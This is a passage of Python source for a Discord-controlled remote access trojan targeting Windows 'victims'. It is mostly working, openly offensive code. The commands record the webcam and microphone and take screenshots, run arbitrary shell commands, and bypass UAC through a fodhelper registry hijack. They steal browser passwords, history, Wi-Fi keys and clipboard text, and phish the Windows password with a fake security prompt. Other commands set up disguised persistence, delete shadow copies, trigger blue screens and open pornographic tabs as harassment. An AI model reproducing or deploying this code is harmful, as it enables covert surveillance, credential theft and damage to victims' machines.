async def stoplogging(ctx):
    global logging_active, log_channel

    if ctx.channel.category and ctx.channel.category.name.startswith("PC") and ctx.channel.name == "commands":
        if not logging_active:
            await ctx.send(":x: No logging is currently active.")
            return

        logging_active = False

        if log_channel:
            await log_channel.delete()
            log_channel = None

        await ctx.send("🔴 Keylogging stopped and the 'keylogging' channel has been deleted.")
    else:
        return

@bot.command(help="Blocks all Inputs.")
async def blockinput(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            await ctx.send("✅ Blocked inputs")
        else:
            await ctx.send("❌ Admin is required")
    else:
        return

@bot.command(help="Troll THE VICTIM WITH 100 TABS OF XHAMSTER :joy:")
async def fappingsession(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        website = "https://nl.xhamster.com/videos/id-do-anything-for-you-step-daddy-step-daughters-first-time-anal-full-movie-xhaPxok"
        windows = 100
        
        def runfunc():
            for _ in range(windows):
                webbrowser.open(website)

        threading.Thread(target=runfunc())
        await ctx.send(":white_check_mark: Triggered")
    else:
        return

@bot.command(help="Unblocks all inputs")
async def unblockinput(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(False)
            await ctx.send("✅ Unblocked inputs")
        else:
            await ctx.send("❌ Admin is required")
    else:
        return

def system(action):
    return '\n'.join(line for line in subprocess.check_output(action, creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip())

def getexten():
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)

def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

def GetSelf() -> tuple[str, bool]:
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)

@bot.command(help="Triggers Blue Screen of Death")
async def bsod(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        await ctx.send(":white_check_mark: Successfuly banged the Computer. :thumbsup:")
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    else:
        return

@bot.command(help="PC Specs")
async def pcinfo(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            cpu = system(r'wmic cpu get name').splitlines()[1]
        except Exception: 
            cpu = 'N/A'
            print(traceback.format_exc())
        try:
            gpu = system(r'wmic path win32_VideoController get name').splitlines()[1]
        except Exception:
            gpu = 'N/A'
            print(traceback.format_exc())
        try:
            screensize = f'{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}'
        except Exception:
            screensize = 'N/A'
            print(traceback.format_exc())
        try:
            refreshrate = system(r'wmic path win32_VideoController get currentrefreshrate').splitlines()[1]
        except Exception:
            refreshrate = 'N/A'
            print(traceback.format_exc())
        try:
            osname = 'Windows ' + system(r'wmic os get version').splitlines()[1]
        except Exception:
            osname = 'N/A'
            print(traceback.format_exc())
        try:
            username = os.getlogin()
        except Exception:
            username = 'N/A'
            print(traceback.format_exc())
        try:
            pcname = system(r'hostname')
        except Exception:
            pcname = 'N/A'
            print(traceback.format_exc())
        try:
            ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
        except Exception:
            ram = 'N/A'
            print(traceback.format_exc())
        try:
            disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
        except Exception:
            disk = 'N/A'
            print(traceback.format_exc())
        
        sep = '='*40
        info_text = f"{sep}\nPC Info:\nCPU: {cpu}\nGPU: {gpu}\nScreen Size: {screensize}\nRefresh Rate: {refreshrate}hz\nOS: {osname}\nRAM: {ram} GB\nDisk: {disk} GB\nUsername: {username}\nPC Name: {pcname}\n{sep}"
        
        await ctx.send(f"```:white_check_mark: Fetched PC Info \n{info_text}```")
    else:
        return

@bot.command(help="Maximizes the Volume")
async def maximizevolume(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        volumeup()
        await ctx.send(":white_check_mark: Maximized Volume")
    else:
        return

@bot.command(help="Sets the volume to 0")
async def mute(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        volumedown()
        await ctx.send(":white_check_mark: Muted")
    else:
        return

@bot.command(help="Puts this process on to critical mode so if this process gets shut down, this will trigger blue screen.")
async def critproc(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
        await ctx.send(":white_check_mark: Done!")
    else:
        return

@bot.command(help="Put this process on neutral mode")
async def uncritproc(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
        await ctx.send(":white_check_mark: Done!")
    else:
        return

@bot.command(help="sends a 30 second recording from their microphone.")
async def recordmic(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            duration = 30
            filename = "recorded_mic.wav"
            chunk = 1024
            format = pyaudio.paInt16
            channels = 1
            rate = 44100

            def record_audio():
                p = pyaudio.PyAudio()
                stream = p.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
                frames = []

                for _ in range(0, int(rate / chunk * duration)):
                    data = stream.read(chunk)
                    frames.append(data)

                stream.stop_stream()
                stream.close()
                p.terminate()

                wf = wave.open(filename, 'wb')
                wf.setnchannels(channels)
                wf.setsampwidth(p.get_sample_size(format))
                wf.setframerate(rate)
                wf.writeframes(b''.join(frames))
                wf.close()

            await asyncio.to_thread(record_audio)
            
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
        except Exception as e:
            await ctx.send(f":x: Error: {e}")
    else:
        return

@bot.command(help="Sends a screenshot from their display")
async def screenshot(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        def take_screenshot():
            screenshot = pyautogui.screenshot()
            image_binary = BytesIO()
            screenshot.save(image_binary, 'PNG')
            image_binary.seek(0)
            return image_binary

        image_binary = await asyncio.to_thread(take_screenshot)
        
        await ctx.reply(file=discord.File(fp=image_binary, filename="screenshot.png"))
        image_binary.close()
    else:
        return

tempfolder = os.getenv('temp')
#works now
@bot.command(help="Sends a 30 second recording from their webcam")
async def recordwebcam(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        duration = 30
        fps = 30

        def record_video():
            with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as temp_video_file:
                temp_video_path = temp_video_file.name

            cap = cv2.VideoCapture(0)
            frame_width = int(cap.get(3))
            frame_height = int(cap.get(4))

            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(temp_video_path, fourcc, fps, (frame_width, frame_height))

            frame_count = 0
            max_frames = duration * fps

            while frame_count < max_frames:
                ret, frame = cap.read()
                if not ret:
                    break
                out.write(frame)
                frame_count += 1

            cap.release()
            out.release()

            return temp_video_path

        video_path = await asyncio.to_thread(record_video)
        await ctx.send(file=discord.File(video_path))
        os.remove(video_path)
    else:
        return

@bot.command(help="Executes a command from command prompt")
async def cmd(ctx, *, command: str):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            result = await asyncio.to_thread(subprocess.run, command, shell=True, capture_output=True, text=True)
            
            output = result.stdout if result.stdout else "No output."
            error = result.stderr if result.stderr else None
            
            if error:
                await ctx.send(f"**Error**:\n```\n{error}\n```")
            else:
                await ctx.send(f"**Output**:\n```\n{output}\n```")

        except Exception as e:
            await ctx.send(f":x: An error occurred while trying to run the command: {e}")
    else:
        return

@bot.command(help="Executes a command from powershell")
async def shell(ctx, *, cmd: str):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        async def run():
            try:
                result = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True)

                output = result.stdout if result.stdout else "No output."
                error = result.stderr if result.stderr else None

                if error:
                    await ctx.send(f"**Error**:\n```\n{error}\n```")
                else:
                    await ctx.send(f"**Output**:\n```\n{output}\n```")

            except Exception as e:
                await ctx.send(f":x: An error occurred while trying to run the command: {e}")

        asyncio.create_task(run())
    else:
        return

#a77a30f63410cd
@bot.command(help="gets IP Info")
async def getip(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            response_ip = requests.get("https://httpbin.org/ip")
            public_ip = response_ip.json().get("origin", "Unavailable")

            response_location = requests.get(f"http://ip-api.com/json/{public_ip}")
            location_data = response_location.json()

            if location_data.get("status") != "fail":
                embed = discord.Embed(title="IP Address Information", color=0x00ff00)
                embed.add_field(name="Public IP Address", value=public_ip, inline=False)

                is_vpn = "Yes" if location_data.get('proxy', False) else "No"
                embed.add_field(name="Using VPN", value=is_vpn, inline=False)

                city = location_data.get("city", "Unknown Location")
                region = location_data.get("regionName", "Unknown Location")
                country = location_data.get("country", "Unknown Location")

                if city != "Unknown Location" and region != "Unknown Location" and country != "Unknown Location":
                    embed.add_field(name="Location", value=f"{city}, {region}, {country}", inline=False)
                    
                    lat = location_data.get("lat")
                    lon = location_data.get("lon")

                    if lat and lon:
                        embed.add_field(name="Coordinates", value=f"Latitude: {lat}, Longitude: {lon}", inline=False)
                        embed.add_field(name="Google Maps Link", value=f"[View on Maps](https://maps.google.com/?q={lat},{lon})", inline=False)
                else:
                    embed.add_field(name="Location", value="Location data not available.", inline=False)

                await ctx.send(embed=embed)
            else:
                await ctx.send(f":x: Failed to fetch location data.")

        except requests.RequestException as e:
            await ctx.send(f":x: Error fetching IP or location data: {e}")
    
    else:
        return

@bot.command(help="Triggers text-to-speech")
async def ttsplay(ctx, *, message: str):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        async def save_and_play():
            with tempfile.NamedTemporaryFile(delete=False, suffix='.mp3') as temp_file:
                tts = gTTS(text=message, lang='en')
                tts.save(temp_file.name)

                audio_file_path = temp_file.name

            try:
                os.startfile(audio_file_path)
                await asyncio.sleep(1)

            except Exception as e:
                await ctx.send(f":x: An error occurred while trying to play the audio: {e}")
                return
            finally:
                if os.path.exists(audio_file_path):
                    os.remove(audio_file_path)

            await ctx.send(":white_check_mark: Audio played successfully.")

        await asyncio.gather(save_and_play())
    else:
        return

@bot.command(help="get Admin permissions without the idiot knowing")
async def bypassadmin(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        def isAdmin():
            try:
                is_admin = (os.getuid() == 0)
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            return is_admin
        if isAdmin():
            await ctx.send(":white_check_mark: you're already admin dummy")
        else:
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            await ctx.send(":clock10: Attempting to get Admin fr")
            isexe = False
            if (sys.argv[0].endswith("exe")):
                isexe = True
            if not isexe:
                test_str = sys.argv[0]
                current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                cur = current_dir
                create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                os.system(create_reg_path)
                create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                os.system(create_trigger_reg_key) 
                create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cur + '""' +  '"' + '"\'"' + """ -Force"""
                os.system(create_payload_reg_key)
            else:
                test_str = sys.argv[0]
                current_dir = test_str
                cur = current_dir
                create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                os.system(create_reg_path)
                create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                os.system(create_trigger_reg_key) 
                create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cur + '""' +  '"' + '"\'"' + """ -Force"""
                os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")  
            time.sleep(2)
            remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
            os.system(remove_reg)

@bot.command(help="Grabs all passwords from browsers")
async def grabpasswords(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            password_stealer = PasswordStealer()
            all_passwords = password_stealer.get_all_passwords()

            passwords_file_path = "decrypted_passwords.txt"

            with open(passwords_file_path, "w", encoding="utf-8") as file:
                for browser, credentials in all_passwords.items():
                    if credentials:
                        file.write(f"==== {browser} Passwords ====\n")
                        for url, username, decrypted_password in credentials:
                            if url and username and decrypted_password:
                                file.write(f"𝐔𝐑𝐋: {url}\n𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}\n𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: {decrypted_password}\n\n")
                        file.write("\n")

            if os.path.getsize(passwords_file_path) > 0:
                await ctx.send(":white_check_mark: Here are the saved passwords:", file=discord.File(passwords_file_path))
            else:
                await ctx.send(":x: No passwords found.")

        except Exception as e:
            await ctx.send(f":x: Error retrieving passwords: {e}")
        
        finally:
            if os.path.exists(passwords_file_path):
                os.remove(passwords_file_path)

    else:
        return

@bot.command(help="Redirects the victim to a browser")
async def website(ctx, url: str):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if url.startswith("http://") or url.startswith("https://"):
            webbrowser.open(url)
        else:
            await ctx.reply(":x: Invalid URL. Please provide a valid URL that starts with http:// or https://")
    else:
        return

@bot.command(help='broadcasts the active window of the victim')
async def recordactivity(ctx):
    global record_event

    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if record_event is not None and record_event.is_set():
            await ctx.send("🟢 Already recording activity.")
            return

        previous_title = ""
        record_event = asyncio.Event()
        record_event.set()
        await ctx.send(":white_check_mark: Started recording active window. Use `!stoprecord` to stop.")

        while record_event.is_set():
            active_window = gw.getActiveWindow()
            if active_window is not None:
                window_title = active_window.title
                if window_title != previous_title:
                    previous_title = window_title
                    activity = discord.Game(name=f"{window_title}")
                    await bot.change_presence(activity=activity)
                    await ctx.send(f":white_check_mark: Activity updated to: Playing {window_title}")
            await asyncio.sleep(1)
    else:
        return

@bot.command(help="Stops broadcasting.")
async def stoprecord(ctx):
    global record_event

    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if record_event is not None and record_event.is_set():
            record_event.clear()
            await ctx.send("🔴 Stopped recording active window.")
        else:
            await ctx.send(":x: No recording is currently active.")
    else:
        return

@bot.command(help="Takes a photo of their webcam.")
async def takephoto(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        def capture_image():
            with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as temp_image_file:
                temp_image_path = temp_image_file.name

            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()

            if ret:
                cv2.imwrite(temp_image_path, frame)
                return temp_image_path
            return None

        temp_image_path = await asyncio.to_thread(capture_image)

        if temp_image_path:
            await ctx.send(file=discord.File(temp_image_path))
            os.remove(temp_image_path)
        else:
            await ctx.send(":x: Failed to capture image.")
    else:
        return

@bot.command(help="Grabs search history from browsers.")
async def grabhistory(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        history_data = get_browser_history()
        history_file_path = "browsing_history.txt"
        
        with open(history_file_path, "w", encoding="utf-8") as file:
            for browser, entries in history_data.items():
                file.write(f"**{browser} History**\n")
                for entry in entries:
                    file.write(f"Title: {entry['title']}, URL: {entry['url']}, Last Visit: {entry.get('last_visit_time', entry.get('last_visit_date'))}\n")
                file.write("\n")

        await ctx.send(file=discord.File(history_file_path))
        os.remove(history_file_path)
    else:
        return

@bot.command(help="Shuts the PC down")
async def shutdown(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        await ctx.send(":white_check_mark: Shutting down the PC...")
        if os.name == "nt":
            os.system("shutdown /s /t 1")
    else:
        return

@bot.command(help="Restarts the PC.")
async def restart(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        await ctx.send(":white_check_mark: Restarting the PC...")
        if os.name == "nt":
            os.system("shutdown /r /t 1")
    else:
        return

@bot.command(help="Sleep modes the PC")
async def sleep(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        await ctx.send(":white_check_mark: Putting the PC to sleep...")
        if os.name == "nt":
            subprocess.run("rundll32.exe powrprof.dll,SetSuspendState Sleep", shell=True)
    else:
        return

@bot.command(help="Task Manager! Kill processes and etc!")
async def taskmanager(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        view = TaskManager(ctx)
        embed = await view.send_task_embed()
        await ctx.send(embed=embed, view=view)
    else:
        return

@bot.command(help="puts this process on startup.")
async def startup(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        roaming = os.getenv("appdata")
        try: elevated = ctypes.windll.shell32.IsUserAnAdmin()
        except Exception: elevated = False
        if elevated:
            try:
                system(f'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:recovery;windowsdefender" /f >nul')
                system(f'reagentc /disable >nul')
                system(f'vssadmin delete shadows /all /quiet >nul')
                shutil.copy2(sys.argv[0],'C:\\Windows\\Cursors\\')
                os.rename(os.path.join('C:\\Windows\\Cursors',os.path.basename(sys.argv[0]),'C:\\Windows\\Cursors\\cursors.cfg'))
                with open('cursorinit.vbs','w') as f: f.write('\' This script loads the cursor configuration\n\' And cursors themselves\n\' Into the shell so that Fondrvhost.exe (The font renderer)\n\' Can use them.\n\' It is recommended not to tamper with\n\' Any files in this directory\n\' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c C:\\Windows\\Cursors\\cursors.cfg\", 0, True\n')
                system(f'schtasks /create /tn "CursorSvc" /sc ONLOGON /tr "C:\\Windows\\Cursors\\cursorinit.vbs" /rl HIGHEST /f >nul')
                ctypes.windll.kernel32.SetFileAttributesW('C:\\Windows\\Cursors',0x2)
                ctypes.windll.kernel32.SetFileAttributesW('C:\\Windows\\Cursors',0x4)
                ctypes.windll.kernel32.SetFileAttributesW(roaming+'\\Cursors',0x256)
                await ctx.send(f":white_check_mark: Done! (With Admin)")
            except Exception as e: await ctx.send(f":x: Error: {e}")
        elif (elevated == False) and (os.getcwd() != os.path.join(roaming,'Cursors')):
            try:
                try: shutil.rmtree(os.path.join(roaming,'Cursors'))
                except Exception: pass
                os.makedirs(roaming+'\\Cursors', 0x1ED, exist_ok=True)
                ctypes.windll.kernel32.SetFileAttributesW(roaming+'\\Cursors',0x2)
                ctypes.windll.kernel32.SetFileAttributesW(roaming+'\\Cursors',0x4)
                ctypes.windll.kernel32.SetFileAttributesW(roaming+'\\Cursors',0x256)
                shutil.copy2(sys.argv[0],os.path.join(roaming,'Cursors\\'))
                os.rename(os.path.join(roaming,'Cursors\\',os.path.basename(sys.argv[0])),os.path.join(roaming,'Cursors\\cursors.cfg',))
                binp = "Cursors\\cursors.cfg"
                initp = "Cursors\\cursorinit.vbs"
                with open(os.path.join(roaming,'Cursors\\cursorinit.vbs'),'w') as f: f.write(f'\' This script loads the cursor configuration\n\' And cursors themselves\n\' Into the shell so that Fondrvhost.exe (The font renderer)\n\' Can use them.\n\' It is recommended not to tamper with\n\' Any files in this directory\n\' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c \'{os.path.join(roaming,binp)}\'\", 0, True\n')
                system(f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "CursorInit" /t REG_SZ /d "{os.path.join(roaming,initp)}" /f >nul')
                await ctx.send(f":white_check_mark: Done! (Without Admin)")
            except Exception as e: await ctx.send(f":x: Error: {e}")
    else:
        return

@bot.command(help="get the last thing that the victim copied.")
async def clipboard(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        CF_TEXT = 1
        kernel32 = ctypes.windll.kernel32
        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.restype = ctypes.c_void_p
        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        user32 = ctypes.windll.user32
        user32.GetClipboardData.restype = ctypes.c_void_p
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            body = value.decode()
            user32.CloseClipboard()
            await ctx.send(":white_check_mark: Gathered Information:\n" + str(body))
    else:
        return

@bot.command(help="Lists all active processes.")
async def listprocess(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if 1==1:
            result = subprocess.getoutput("tasklist")
            numb = len(result)
            if numb < 1:
                await ctx.send(":x: Command not recognized")
            elif numb > 1990:
                temp = (os.getenv('TEMP'))
                if os.path.isfile(temp + r"\output.txt"):
                    os.system(r"del %temp%\output.txt /f")
                f1 = open(temp + r"\output.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File(temp + r"\output.txt", filename="output.txt")
                await ctx.send(":white_check_mark: Snagged them processes", file=file)
            else:
                await ctx.send(":white_check_mark: Snagged them processes" + result) 
    else:
        return

@bot.command(help="gets all wifi passwords.")
async def getwifipasswords(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            x = subprocess.run("NETSH WLAN SHOW PROFILE", stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
            x = x[x.find("User profiles\r\n-------------\r\n")+len("User profiles\r\n-------------\r\n"):].replace('\r\n\r\n"', "").replace('All User Profile', r'"All User Profile"')[4:]
            lst = []
            done = []

            for i in x.splitlines():
                i = i.replace('"All User Profile"     : ', "")
                i = i.strip()
                if i:
                    lst.append(i)

            for e in lst:
                output = subprocess.run(f'NETSH WLAN SHOW PROFILE "{e}" KEY=CLEAR ', stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                for line in output.splitlines():
                    if "Key Content" in line:
                        ok = line.strip().split(": ")[1]
                        done.append(f"{e}: {ok}")
                        break
                else:
                    done.append(f"{e}: No password found(Likely to be a WiFi with no password.)")

            embed = discord.Embed(title="WiFi Passwords", color=discord.Color.blue())
            for entry in done:
                ssid, password = entry.split(": ", 1)
                embed.add_field(name=ssid, value=password, inline=False)

            await ctx.send(embed=embed)
        else:
            await ctx.send("🔐 This command requires Administrator permission from the Victim.")
    else:
        return

@bot.command(help="kill a process by name.")
async def killprocess(ctx, *, proc: str):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        kilproc = f'taskkill /IM "{proc}" /f'
        os.system(kilproc)
        time.sleep(2)
        process_name = proc
        call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
        output = subprocess.check_output(call).decode()
        last_line = output.strip().split('\r\n')[-1]
        done = (last_line.lower().startswith(process_name.lower()))
        if done == False:
            await ctx.send(":white_check_mark: 🔪🩸Killed process")
        elif done == True:
            await ctx.send(':x: ERROR OCCURED') 
    else:
        return

@bot.command(help="Get the windows PIN that the victim uses. (may not be correct at times.)")
async def getwindowspassword(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        popui = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
        popuipass = 'echo $cred.getnetworkcredential().password;'
        full_cmd = 'Powershell "{} {}"'.format(popui,popuipass)

        def shell():   
            output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return output
        result = str(shell().stdout.decode('CP437'))
        await ctx.send(":white_check_mark: Please wait for a result...")
        await ctx.send(":white_check_mark: password user typed in is:\n ```" + result + "```")
    else:
        return

@bot.command(help="Live feed of the webcam")
async def streamwebcam(ctx):
    global streaming_task

    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        camera_port = 0
        camera = cv2.VideoCapture(camera_port)

        if not camera.isOpened():
            await ctx.send("No camera detected.")
            return

        category = ctx.channel.category
        guild = ctx.guild
        live_channel = await guild.create_text_channel('live-webcam', category=category)

        async def webcam_stream():
            try:
                while True:
                    return_value, image = camera.read()
                    if not return_value:
                        await live_channel.send("Error: Unable to access webcam.")
                        break
                    
                    _, encoded_image = cv2.imencode('.png', image)
                    image_bytes = encoded_image.tobytes()

                    boom = discord.File(BytesIO(image_bytes), filename="temp.png")
                    await live_channel.send(file=boom)

                    await asyncio.sleep(1)

            finally:
                camera.release()
                await live_channel.delete()

        streaming_task = asyncio.create_task(webcam_stream())
    else:
        return

@bot.command(help="Stops streaming of the webcam.")
async def stopstreaming(ctx):
    global streaming_task
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if streaming_task and not streaming_task.done():
            streaming_task.cancel()
            await ctx.send("Streaming stopped.")
        else:
            await ctx.send("No active streaming session to stop.")
    else:
        return

@bot.command(help="Checks if the process has admin.")
async def admincheck(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            await ctx.send(":white_check_mark:")
        elif is_admin == False:
            await ctx.send(":x:")
    else:
        return

@bot.command(help="Hides the file.")
async def hide(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        frame = inspect.getframeinfo(inspect.currentframe()).filename
        os.system("""attrib +h "{}" """.format(frame))
        await ctx.send(f":white_check_mark: File {frame} successfully hidden")
    else:
        return

@bot.command(help="Unhides the file.")
async def unhide(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        frame = inspect.getframeinfo(inspect.currentframe()).filename
        os.system("""attrib -h "{}" """.format(frame))
        await ctx.send(f":white_check_mark: File {frame} successfully shown")
    else:
        return

@bot.command(help="Turns the monitor off. (requires Admin)")
async def displayoff(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            WM_SYSCOMMAND = 274
            HWND_BROADCAST = 65535
            SC_MONITORPOWER = 61808
            ctypes.windll.user32.BlockInput(True)
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            await ctx.send(":white_check_mark: Done!")
        else:
            await ctx.send(":x: Admin is required for this command (sadly)")
    else:
        return

@bot.command(help="Turns the monitor on. (requires Admin)")
async def displayon(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            keyboard = Controller()
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)
            ctypes.windll.user32.BlockInput(False)
            await ctx.send(":white_check_mark: Done!")
        else:
            await ctx.send(":x: Admin is required for this command (sadly)")
    else:
        return

@bot.command(help="sets the wallpaper to the image attached.")
async def setwallpaper(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if ctx.message.attachments:
            path = os.path.join(os.getenv('TEMP'), "temp.jpg")
            
            await ctx.message.attachments[0].save(path)
            
            async def set_wallpaper():
